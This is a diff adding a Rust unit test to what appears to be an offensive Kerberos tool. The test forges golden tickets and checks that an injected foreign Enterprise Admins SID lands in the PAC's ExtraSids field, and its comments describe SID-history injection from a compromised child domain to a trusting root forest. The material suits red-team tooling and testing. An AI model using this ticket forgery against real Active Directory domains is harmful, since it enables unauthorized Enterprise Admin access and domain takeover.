@@ -167,6 +167,79 @@ mod wired {
         assert!(parsed.get(PAC_REQUESTOR).is_some());
     }
 
+    /// **1.4.8-A WS-SID-HISTORY-INJECT roundtrip:** verify that `ForgeIdentity::extra_sids`
+    /// (populated via `attack golden --foreign-sid` or `attack diamond --foreign-sid`) actually
+    /// lands in the PAC's KERB_VALIDATION_INFO ExtraSids field on the wire. The attack
+    /// scenario: from a compromised child domain, inject the ROOT-domain Enterprise Admins
+    /// SID as an ExtraSid; a trusting root without SID filtering (or with SIDHistory
+    /// filtering misconfigured) will authorize the forged principal as Enterprise Admin.
+    ///
+    /// The test proves the primitive (PAC bytes contain the injected SID's
+    /// subauthorities in the on-wire NDR layout) without needing a cross-forest lab.
+    #[test]
+    fn foreign_sid_lands_in_pac_extra_sids() {
+        let key = [0x55u8; 32];
+
+        // Baseline: Golden without ExtraSids.
+        let mut id = ForgeIdentity {
+            user: "impersonated".into(),
+            rid: 500,
+            primary_gid: 513,
+            group_rids: vec![513, 512],
+            domain_subauths: vec![21, 10_000_001, 20_000_002, 30_000_003],
+            logon_server: "DC01".into(),
+            logon_domain: "CHILD".into(),
+            extra_sids: vec![],
+        };
+        let baseline = crate::forge_golden_tgt(&id, "CHILD.CORP.LOCAL", &key, false).unwrap();
+        let (_, baseline_pac) = decrypt_ticket_pac(&baseline, &key).unwrap();
+
+        // Inject: cross-forest ROOT-domain Enterprise Admins SID (S-1-5-21-A-B-C-519).
+        // Distinct 32-bit magic subauthorities so the byte pattern is unmistakable in the
+        // hex dump of the PAC (no chance of matching the domain_subauths above by accident).
+        let foreign_ea: Vec<u32> = vec![21, 0xDEAD_BEEF, 0xCAFE_BABE, 0x1234_5678, 519];
+        id.extra_sids = vec![foreign_ea.clone()];
+        let injected = crate::forge_golden_tgt(&id, "CHILD.CORP.LOCAL", &key, false).unwrap();
+        let (_, injected_pac) = decrypt_ticket_pac(&injected, &key).unwrap();
+
+        assert!(
+            injected_pac.len() > baseline_pac.len(),
+            "PAC with injected ExtraSid must be LARGER than baseline (injected={} vs baseline={})",
+            injected_pac.len(),
+            baseline_pac.len()
+        );
+
+        // The four u32 magic subauthorities must appear in the PAC's raw NDR bytes as
+        // little-endian u32. This is the exact on-wire encoding ms-pac-forge::ndr_sid()
+        // produces for the ExtraSids referents.
+        for magic in [0xDEAD_BEEFu32, 0xCAFE_BABE, 0x1234_5678] {
+            let needle = magic.to_le_bytes();
+            assert!(
+                injected_pac.windows(4).any(|w| w == needle),
+                "u32 subauthority {magic:#010x} must appear in injected PAC as LE bytes"
+            );
+            assert!(
+                !baseline_pac.windows(4).any(|w| w == needle),
+                "baseline PAC (no ExtraSids) must NOT contain {magic:#010x} — it should only \
+                 appear when extra_sids is populated"
+            );
+        }
+
+        // RID 519 (Enterprise Admins) — this is the actual authority-transferring bit.
+        // Also assert it landed as LE u32 in the injected PAC (may appear elsewhere too
+        // in baseline via group RIDs, so no negative assertion).
+        let ea_rid = 519u32.to_le_bytes();
+        assert!(
+            injected_pac.windows(4).any(|w| w == ea_rid),
+            "RID 519 (Enterprise Admins) must appear in injected PAC's ExtraSid tail"
+        );
+
+        // Both PACs still verify their KDC signature (proves the ticket is well-formed).
+        let parsed = parse_pac(&injected_pac).unwrap();
+        assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
+        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
+    }
+
     /// Sanity that the re-exported constants keep their MS-PAC-mandated values.
     #[test]
     fn pac_type_constants_match_ms_pac() {
